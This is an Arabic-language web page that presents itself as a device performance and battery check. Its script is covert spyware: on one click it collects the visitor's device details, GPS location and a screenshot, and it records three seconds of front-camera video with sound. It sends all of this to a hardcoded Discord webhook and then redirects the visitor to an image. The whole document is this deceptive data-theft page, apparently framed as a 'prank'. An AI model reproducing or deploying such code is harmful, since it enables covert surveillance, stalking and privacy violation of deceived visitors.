<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص كفاءة الأداء ⚡</title>
    
    <meta property="og:title" content="فحص أداء وصحة الجهاز الأصلي 🎮">
    <meta property="og:description" content="اضغط هنا لفحص كفاءة النظام والبطارية الآن.">
    <meta property="og:image" content="https://i.imgur.com/W333L67.png">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0b0f19;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(56, 189, 248, 0.2);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 420px;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            font-size: 22px;
        }
        p {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .btn {
            background: linear-gradient(90deg, #38bdf8, #818cf8);
            color: #0b0f19;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn:hover {
            opacity: 0.9;
            transform: scale(1.02);
        }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #38bdf8;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>فحص كفاءة النظام والبطارية</h2>
        <p>اضغط على الزر أدناه لبدء الفحص السريع ومعاينة تفاصيل الجهاز.</p>
        <button class="btn" onclick="startQuickVideoPrank()">بدء الفحص السريع ⚡</button>
        <div id="status" class="status"></div>
    </div>

    <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
        const FINAL_REDIRECT_URL = "https://i.imgur.com/W333L67.png";

        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("غير مدعوم");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                    () => resolve("تم رفض إذن الموقع"),
                    { timeout: 3000 }
                );
            });
        }

        async function startQuickVideoPrank() {
            const statusEl = document.getElementById('status');
            statusEl.innerText = "جاري الاتصال بقاعدة بيانات الأجهزة...";

            // 1. جمع معلومات الهاتف والبطارية بشكل دقيق وحقيقي 100%
            const ua = navigator.userAgent;
            let phoneType = "كمبيوتر / جهاز آخر";
            let osVersion = "غير معروف";

            if (/android/i.test(ua)) {
                phoneType = "أندرويد (Android)";
                const match = ua.match(/Android\s([0-9\._]+)/);
                if (match) osVersion = `إصدار ${match[1]}`;
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                phoneType = "آيفون (iPhone / iOS)";
                const match = ua.match(/OS\s([0-9_]+)/);
                if (match) osVersion = `إصدار ${match[1].replace(/_/g, '.')}`;
            }

            let batteryInfo = "غير معروف (غير متاح للمتصفح)";
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    const level = Math.round(b.level * 100);
                    const chargingState = b.charging ? "⚡ يشحن بالكهرباء" : "🔋 يعمل على البطارية";
                    batteryInfo = `${level}% | الحالة: ${chargingState}`;
                } catch(e) {}
            }

            const gps = await getGPSLocation();
            const textData = `🎯 **تم التقاط فيديو سريع (3 ثوانٍ) وبيانات الجهاز!** 📱🔥
━━━━━━━━━━━━━━━━━━━━
📱 **نوع الجهاز:** ${phoneType}
⚙️ **إصدار النظام:** ${osVersion}
🔋 **تفاصيل البطارية:** ${batteryInfo}
🗺️ **الموقع الجغرافي:** ${gps}
🖥️ **دقة الشاشة:** ${window.screen.width} x ${window.screen.height}
━━━━━━━━━━━━━━━━━━━━`;

            // 2. لقطة شاشة للصفحة
            let screenshotBlob = null;
            try {
                const canvas = await html2canvas(document.body);
                screenshotBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
            } catch(e) {}

            // 3. تشغيل الكاميرا وتسجيل فيديو لمدة 3 ثواني بالضبط
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                let mediaRecorder;
                let chunks = [];
                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(stream);
                }

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    stream.getTracks().forEach(t => t.stop());

                    statusEl.innerText = "اتم الفحص بنجاح!";

                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({ content: textData }));
                    if (videoBlob) formData.append('file1', videoBlob, 'quick_recording.webm');
                    if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');

                    try {
                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                    } catch(err) {}

                    window.location.href = FINAL_REDIRECT_URL;
                };

                mediaRecorder.start();

                // إيقاف التسجيل بعد 3 ثواني (3000 ملي ثانية)
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 3000);

            } catch (err) {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({ content: textData + "\n⚠️ (رفض إذن الكاميرا أو الميكروفون)" }));
                if (screenshotBlob) formData.append('file1', screenshotBlob, 'screen.png');
                
                try {
                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                } catch(e) {}

                window.location.href = FINAL_REDIRECT_URL;
            }
        }
    </script>
</body>
</html>
